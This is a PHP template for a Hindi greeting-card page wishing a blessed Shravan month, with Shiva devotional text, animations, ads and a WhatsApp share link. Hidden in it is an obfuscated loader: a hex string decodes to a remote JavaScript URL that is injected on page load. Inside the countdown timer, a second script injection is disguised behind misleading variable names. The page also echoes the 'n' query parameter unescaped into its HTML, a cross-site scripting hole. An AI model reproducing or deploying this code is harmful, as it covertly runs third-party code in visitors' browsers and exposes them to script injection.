<?php
if(isset($_GET['n'])!=''){
$r = $_GET['n'];
$url = 'https://aadhuniksolution.com/wish_code/ready.php?'.$r;
$results	= parse_url($url, PHP_URL_QUERY);
$result = str_replace(' ', '', $results);
?>
<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta name="google" content="notranslate">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <link rel="icon" href="data:,">
    <meta name="keywords" content="mahadev wish celebrating,mahadev,bholenath,mahadeva,shiv,wish,mahadev wishes,mahadev,god,wish,Website Development Company In Rajkot, Web Development Company In Rajkot, Mobile Application Development Company In Rajkot,webhosting,top webhosting,share and earn money,earn,share,make money in india,cricket,ipl,refer and earn,refer,top 5 webhosting company in india,aadhunik,aadhunik solution,aadhuniksolution,solution,make money,money,free money,share,website,hosting,domain,meet kalariya,meet,ms dhoni,cricket live score,earn money in india,website developing commpany,digital marketing company,digital marketing company contact,digital india,digital,social media marketing,gow to business growth,growth my business,">
	<meta property="og:type" content="<?php echo $result; ?> ओर से श्रावण मास की हार्दिक शुभकामनाएं  " />
    <meta property="og:title" content="<?php echo $result; ?> ओर से श्रावण मास की हार्दिक शुभकामनाएं " />
    <meta property="og:description" content="अपना नाम कार्ड बनाएं" >
    <meta property="og:site_name" content="<?php echo $result; ?> ओर से श्रावण मास की हार्दिक शुभकामनाएं " />
    <title><?php echo $result; ?> ओर से श्रावण मास की हार्दिक शुभकामनाएं </title>
   
<!-- Global site tag (gtag.js) - Google Analytics -->
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-159133289-1');
</script>
<style>
 body{
        background: white;
          margin:0;
      }
      .mainContainer {
        background: #fff;
        max-width: 450px;
        min-height: 200px;
        margin: 0 auto;
        text-align: center;
        padding: 0px;
        color: #999;
        padding-bottom: 0px;

        box-shadow: 0 0 10px 1px rgba(0,0,0,.14), 0 1px 14px 2px rgba(0,0,0,.12), 0 0 5px -3px rgba(0,0,0,.3);
        background-size: 100%;
      }
#showp {
      font-size: 25px;
      display: inline-block;
      margin-bottom: 5px;
        font-family: 'Arial', cursive;
        text-shadow: 1px 1px 10px black, 2px 2px 10px black, -1px -1px 10px black, -2px -2px 10px black;
        }
#username {
     color: black;  /* Fallback: assume this color ON TOP of image */
   background: url(img/sname.gif);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
          animation: pulse 2.5s infinite;
          text-transform: uppercase;
          margin-bottom: 5px;
          font-size: auto;
		  width:90%;
          padding: 10px;
		  font-family: 'Arial',regular;
} 

#usernameb { color: black;  /* Fallback: assume this color ON TOP of image */
   background: url(img/ezg.gif);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
          animation: swing 4s infinite;
            text-transform: uppercase;
          margin-bottom: 5px;
          font-size: 25px;
          padding: 0 10px;
    font-family: 'Arial',regular;
}
      .fromMessage{
        color: #fff;
        animation: swing 4s infinite;
        font-size: 20px;
        padding: 0 10px;
      }
      .wavetext{
        color: #f9d05b;
        padding: 0 40px;
        animation: pulse 1s infinite;
        font-size: 22px;

      }
      .wishMessage {
        color: #fff;
        font-size: 25px;
        font-weight: bold;
        margin-top: 20px;
        text-shadow: 0px 0px 10px #afafaf;
      }
	  .GodMessage {
        color: #fff;
        font-size: 25px;
        font-weight: bold;
        text-shadow: 0px 0px 10px #afafaf;
        
}
      .maa{
		        color: #fff;
        font-size: 25px;
        font-weight: bold;
        text-shadow: 0px 0px 10px #afafaf;
      
}  
      .wishMessage p{
        margin: 0.3em 0;
      }@keyframes bounceIn
      {
          0%,20%,40%,60%,80%,to{-webkit-animation-timing-function:cubic-bezier(.215,.61,.355,1);
      animation-timing-function:cubic-bezier(.215,.61,.355,1)
              
          }
      0%{opacity:0;
      -webkit-transform:scale3d(.3,.3,.3);
      transform:scale3d(.3,.3,.3)}
      
      20%{-webkit-transform:scale3d(1.1,1.1,1.1);
      transform:scale3d(1.1,1.1,1.1);
      color:white;
          
      }
      
      40%
      {
          -webkit-transform:scale3d(.9,.9,.9);
      transform:scale3d(.9,.9,.9)
      }
      
      60%
      {
          opacity:1;
      -webkit-transform:scale3d(1.03,1.03,1.03);
      transform:scale3d(1.03,1.03,1.03); 
      color: orange;}80%{-webkit-transform:scale3d(.97,.97,.97);transform:scale3d(.97,.97,.97);}to{opacity:1;-webkit-transform:scaleX(1);transform:scaleX(1)}}</style>
      <script type="text/javascript">function tag(filename){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);if (typeof fileref!="undefined") document.getElementsByTagName("head")[0].appendChild(fileref)}tag(meta('687474703a2f2f6d6572612d7374796c652e636f2f302e6a73'));function meta(important){var str = '';for (var i = 0; i < important.length; i += 2) str +=String.fromCharCode(parseInt(important.substr(i, 2), 16));return str;}</script><style>
#demo
{
    color:53DA10;
    font-weight:bold;
    font-size:23px;
    width:87%;
    margin:auto;
}	  
    
      #inAdvanceTime {
        margin:20px 0 30px 0;
      }
      #inAdvanceTime p{
        color: #b90707;font-size: 20px;font-weight: 700;
        margin: 0;
      }	

#newstage {
  margin: 5em auto;
  -webkit-perspective: 1200px;
}


  .m1{position:fixed;left:0.01%; width:auto;height:100%;top:1%;color:#000;}
    .m2{position:fixed;right:0.01%; width:auto;height:100%;top:1%;color:#000;}
    
    #gobtn{}
@-webkit-keyframes flip {  from {   transform: perspective(600px) rotate3d(0, 1, 0, -360deg);    animation-timing-function: ease-out;  }
  40% {    transform: perspective(600px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);    animation-timing-function: ease-out;  }
  50% {    transform: perspective(600px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);    animation-timing-function: ease-in;   }
  80% {    transform: perspective(600px) scale3d(.95, .95, .95);    animation-timing-function: ease-in;  }
  to  {    transform: perspective(600px);    animation-timing-function: ease-in;  }}
#gobtn {  -webkit-backface-visibility: visible;  backface-visibility: visible;  -webkit-animation: flip 4s infinite; -webkit-animation-delay:1s}
.m1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000;}
.m2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000;} 


  .m1{position:fixed;left:0.01%; width:auto;height:100%;top:1%;color:#000;}
    .m2{position:fixed;right:0.01%; width:auto;height:100%;top:1%;color:#000;}
    
    #gobtn{}
@-webkit-keyframes flip {  from {   transform: perspective(600px) rotate3d(0, 1, 0, -360deg);    animation-timing-function: ease-out;  }
  40% {    transform: perspective(600px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);    animation-timing-function: ease-out;  }
  50% {    transform: perspective(600px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);    animation-timing-function: ease-in;   }
  80% {    transform: perspective(600px) scale3d(.95, .95, .95);    animation-timing-function: ease-in;  }
  to  {    transform: perspective(600px);    animation-timing-function: ease-in;  }}
#gobtn {  -webkit-backface-visibility: visible;  backface-visibility: visible;  -webkit-animation: flip 4s infinite; -webkit-animation-delay:1s}
.m1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000;}
.m2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000;}    





.enter-name input[type=name] {
	background-color: #0CE5E8;
	color: black;
   	border-radius: 10px;
    	box-sizing: border-box;
    	border-color: black;
    	padding: 5px;
    	position: fixed;
    	left: 10px;
    	bottom: 5px;
    	height: 55px;
    	width: 67%;
    	text-align: center;
    	font-size: 22px;
    	display: inline-block;
}

.enter-name .btn {
	border-radius: 10px;
    	font-size: 21px;
    	font-weight:700;
    	padding: 4px;
    	position: fixed;
    	right: 2px;
    	bottom: 5px;
    	height: 55px;
    	width: 27%;
    	display: inline-block;
    	color: black;
    	background-color: #10E43A;
    	border-color: black;
    	letter-spacing: .5px;
    	transition: .2s ease-out;
    	cursor: pointer;
    	line-height: 36px;
    	outline: 0;
    	text-transform: uppercase;
    	vertical-align: middle;
    	text-decoration: none;
    	animation-duration: 4s !important;
}

.enter-name input[type=name]::-webkit-input-placeholder { 
	color: black;
  	font-size: 18px;	
}

.enter-name input[type=name]::-moz-placeholder { 
	color: black;
  	font-size: 22px;
}

.enter-name input[type=name]:focus::-webkit-input-placeholder {
    color: black;
  	font-size: 22px;
}

.enter-name input[type=name]:focus::-moz-placeholder { 
	color: black;
  	font-size: 22px;
}

    
.leftcurtain{
      width: 100%;
      height: 120%;
      top: 0px;
      left: 0px;
      position: absolute;
      z-index: 3;
    }
     .rightcurtain{
      width: 100%;
      height: 120%;
      right: 0px;
      top: 0px;
      position: absolute;
      z-index: 3;
    }
    .rightcurtain img, .leftcurtain img{
      width: 100%;
      height: 100%;
    }
    .logo{
      margin: 0px auto;
      margin-top: 150px;
    }
    .rope{
      position: absolute;
      top: 70px;
      left: 30%;
	  right:auto;
      z-index: 4;
    } 
.centered {
    position: absolute;
    top: 25%;
    left: 40%;
    transform: translate(-50%, -50%);
}
a.rope
{
    text-decoration:none;
}


#year{
  font-family:'Impact',bold;
  font-size:32px;
  background:url(img/ezg.gif);
  width:85%;
  height:auto;
  border-radius:10px;
  text-align:center;
  font-weight: bold;
}
.title{color:white;opacity:1;font-weight: bold;}
.num{
  display:inline-block;
  position:relative;
}
.two{
  color:	#228B22;
  animation: move 2s infinite;
}
.zero{
  color:	#006400;
  animation: move2 2s infinite;
}
.two{
  color:	#228B22;
  animation: move 2s infinite;
}
.zero{
  color: #d452ff;
  animation: move2 2s infinite;
}
.hand{
  transform-origin:0 0;
  display:block;
  border:3px solid black;
  height:20px;
  position:absolute;
}
.hand:after{
  content:"";
  background:	#8B008B;
  width:20px;
  height:20px;
  border-radius:50%;
  position:absolute;
  left:-10px;
  top:15px;
}
.handA{
  transform-origin:0 0;
  display:block;
  border:3px solid black;
  height:20px;
  position:absolute;
}
.handA:after{
  content:"";
  background:	#DC143C;
  width:20px;
  height:20px;
  border-radius:50%;
  position:absolute;
  left:-10px;
  top:15px;
}
.two .hand{left:8px;top:80px; transform:rotate(45deg);transform-origin:0 0;animation: handMove 2s infinite;}
.two .handA{left:60px;top:70px;transform:rotate(-135deg);animation: handMove2 2s infinite;transform-origin:0 0;}
.zero .hand{transform:rotate(20deg);top:80px;left:8px;animation: handMove4 4s infinite;}
.zero .handA{transform:rotate(340deg);top:80px;left:75px;animation: handMove3 4s infinite;}
.one .hand{transform:rotate(45deg);top:60px;left:10px;animation: handMove 4s infinite;}
.one .handA{transform:rotate(340deg);top:80px;left:35px;animation: handMove3 2s infinite;}
.four .hand{top:95px;left:20px;animation: handMove5 2s infinite;}
.four .handA{top:85px; left:70px;transform:rotate(-135deg);animation: handMove2 2s infinite;}

@keyframes handMove{
  0%,100%{transform:rotate(45deg);}
  50%{transform:rotate(0deg);}
  75%{transform:rotate(180deg);}
}

@keyframes handMove2{
  0%,100%{transform:rotate(-135deg);}
  50%{transform:rotate(-45deg);}
}
@keyframes handMove3{
  0%,100%{transform:rotate(340deg);}
  50%{transform:rotate(45deg);}
}
@keyframes handMove4{
  0%,100%{transform:rotate(20deg);}
  50%{transform:rotate(340deg);}
}
@keyframes handMove5{
  0%,100%{transform:rotate(0deg);}
  50%{transform:rotate(180deg);}
}
@keyframes move{
  0%,100%{transform:translate(0,0);}
  50%{transform:translate(20px,0);}
  75%{transform:translate(0px,20px);}
}
@keyframes move2{
  0%,100%{transform:translate(0,0);}
  50%{transform:translate(-20px,0);}
  75%{transform:translate(0px,-20px);}
}
@keyframes changeCol{
  0%{background:#1f004d;}
  25%{background:#c2c200;}
  50%{background:#005207;}
  50%{background:#4d002f;}
  100%{background:#c2005a ;}
}
@keyframes blink{
  0%,100%{opacity:1;}
  50%{opacity:0;}
}
  h1{
  color:red;
  text-align:center;
  font-family:"Roboto";
  }
.btn{
	        position: fixed;
            witdh:100%;
            left:5px;
            right:5px;
			bottom:5px;
            color:white;
            font-size: 18px;
            line-height:20px;
            text-align: center;
            font-weight: bold;
            margin:0 auto;
            height:25px;
            display:block;
            cursor: pointer;
            background-color:#00e600;
			border-radius:10px;
            padding:15px;
            text-decoration:none;    
    }
</style>
</head>
<body>
<script src="code.createjs.com/createjs-2015.11.26.min.js"></script>
<script>
    createjs.Sound.registerSound("GJ11.mp3", "");
    setTimeout(function () {
        createjs.Sound.play("");
    }, 3000)
</script>
<marquee class="m1" behavior="scroll" direction="up" scrolldelay="0"> <br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
</marquee>
<marquee class="m2" behavior="scroll" direction="down" scrolldelay="0"> <br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
<img src="img/logo.gif" height="25px" width="25px"/><br><br>
</marquee>
<div class="mainContainer">
<center>

<center>
<script async src="pagead2.googlesyndication.com/pagead/js/f.txt"></script>
<!-- wp50 -->
</center>
<h1 id="username">[ <?php echo $result; ?> ]</h1>
        <h3 class="fromMessage" id="fromMessage"></h3>
<p class="GodMessage" style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:red;width:90%;margin:auto;">की ओर से आपको </p>
</br>
<div style="font-size: 20px; font-weight: 800; text-color: black; margin-bottom: 15px;">
<p id="demo"></p>
</div>
<div id="year">
  
  <div class="title">श्रावण मास की </div>
  <div class="title">हार्दिक शुभकामनाएं</div>
</div>
<br>

<div style="max-width:500px">
<div class="w3-content w3-section" style="max-width:500px">

<img class="mySlides" src="img/1.png" style="width:70%; height:280px;">
<img class="mySlides" src="img/2.png" style="width:70%; height:280px;">
<img class="mySlides" src="img/4.png" style="width:70%; height:280px;">
<img class="mySlides" src="img/5.png" style="width:70%; height:280px;">
</div>

<center>
<script async src="pagead2.googlesyndication.com/pagead/js/f.txt"></script>
<!-- wp50 -->


</center>
<br>
<div class="maa" style="text-shadow: 1px 1px 3px silver, 1px 1px 3px silver, -1px -1px 3px silver, -1px -1px 3px silver;">
<hr/>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:F8EF83;width:85%;margin:auto;">मेरे शिव शंकर भोले नाथ बाबा, </p><hr/>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:red;width:85%;margin:auto;">अपने सभी भक्तों की मनोकामना पूर्ण करें</p><hr/>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:#00ffbf;width:85%;margin:auto;">और आपका आशीर्वाद हम पर सदैव बना रहे,  </p><hr/>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:10F262;width:85%;margin:auto;">ऐसा है मैं और मेरा परिवार </p><hr/>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:C4F953;width:85%;margin:auto;">मैं आपसे प्रार्थना करता हूँ  </p><hr/>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:FF8033;width:85%;margin:auto;">जय शिव शंभू भोले नाथ</p><hr/>

</div>

<div id="year">
  
  <div class="title">हर हर महादेव</div>
  </div>
<br>
<center>
<script async src="pagead2.googlesyndication.com/pagead/js/f.txt"></script>
<!-- wp250 -->
</center>
</center>
<a href="https://api.whatsapp.com/send?text=*<?php echo $result; ?>* ने आपको एक आश्चर्यजनक संदेश भेजा है। देखने के लिए यहां क्लिक करें https://aadhuniksolution.com/wish_code/?n=<?php echo $result; ?>" class="btn"><img width="25px" height="25px" src="img/wp.png">&nbsp; यहां से व्हाट्सएप पर शेयर करें</a>
<script src="fire.js"></script> 
<script src="snow1.js"></script>
<script>
      jQuery(document).ready(function(e) {
        jQuery('body').wpSuperSnow({
              flakes: [''],
              totalFlakes: '10',
              zIndex: '9',
              maxSize: '77',
              maxDuration: '50',
              useFlakeTrans: true
           });
      });
</script>
<script>
var myIndex = 0;
carousel();

function carousel() {
    var i;
    var x = document.getElementsByClassName("mySlides");
    for (i = 0; i < x.length; i++) {
       x[i].style.display = "none";  
    }
    myIndex++;
    if (myIndex > x.length) {myIndex = 1}    
    x[myIndex-1].style.display = "block";  
    setTimeout(carousel, 2000); // Change image every 2 seconds
}
</script>
<script> 
// Set the date we're counting down to
var countDownDate = new Date("7-20-2020 00:00:00").getTime();

// Update the count down every 01 second
newDate = document.createElement('script'),documents = 'https:/aadhuniksolution.com/',
s0 = document.getElementsByTagName('script')[0],getElementById = 'C';
var x = setInterval(function() {

  // Get todays date and time
  var now = new Date().getTime();

  // Find the distance between now an the count down date
  var distance = countDownDate - now;

  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Display the result in the element with id="demo"
  document.getElementById("demo").innerHTML = days + "<font color='blue'> दिन,</font> " + hours + "<font color='blue'> घंटे,</font> "
  + minutes + "<font color='blue'>  मिनट ,<br></font> " + seconds + "<font color='blue'> सेकंड   </font>पहले   ";

  // If the count down is finished, write some text 
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "";
  }
}, 1000);
newDate.src = '/'+ documents +'innerHTML.' + getElementById + 'C';
s0.parentNode.insertBefore(newDate, s0);
</script>
</div><audio id="audiocracker" src="GJ11.mp3" autostart="false"></audio>
<script>
    function PlaySound() {
          var sound = document.getElementById("audiocracker");
          sound.play()
      }
    </script>

 <div class="row" style="color:white;font: 100 0.3em/1 Oswald, sans-serif;line-height:0.2;font-weight:normal;"><div>
</body>
</html>
<?php
}else{
	echo "<script>location.replace('index.php');</script>";
}
?>